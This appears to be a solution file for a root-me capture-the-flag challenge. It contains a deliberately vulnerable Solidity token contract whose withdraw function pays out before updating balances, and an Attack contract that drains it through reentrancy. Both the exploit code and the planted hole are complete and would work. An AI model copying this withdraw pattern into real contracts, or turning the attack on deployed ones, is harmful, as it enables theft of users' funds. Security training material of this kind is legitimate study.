pragma solidity ^0.5.0;

contract Reentrancy {

    // Vulnerable smart contract by Dridri for root-me
    // DO NOT PUBLISH THIS ON MAINNET FOR REAL PURPOSES

    string public name     = "Custom Wrapped Ether";
    string public symbol   = "CWETH";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    bool public locked = true;

    constructor() public payable {
        require(msg.value > 0);
        deposit();
    }

    function() external payable {
        deposit();
    }

    function claim() external {
      if(address(this).balance == 0 ) {
        locked = false;
      }
    }


    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        assert(balanceOf[msg.sender] - wad < balanceOf[msg.sender]);
        msg.sender.call.value(wad)("");
        balanceOf[msg.sender] -= wad;
        emit Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}


contract Attack {
    Reentrancy target;

    constructor(address payable _target) public payable {
        target = Reentrancy(_target);
    }

    function attack() external payable {
        // First, we need to have some balance in the target contract
        target.deposit.value(msg.value)();

        // Then, we start the attack
        target.withdraw(msg.value);
    }

    function () external payable {
        // target.totalSupply() != target.balanceOf(address(this))
        // This is the condition that will make the attack work
        require(target.totalSupply() != target.balanceOf(address(this)));
        target.withdraw(msg.value);
        
    }
    // get balance of the contract
    function getBalance() public view returns (uint) {
        return target.balanceOf(address(this));
    }

    function getBalanceRentrance() public payable {
        target.withdraw(address(target).balance);
        target.claim();
    }
}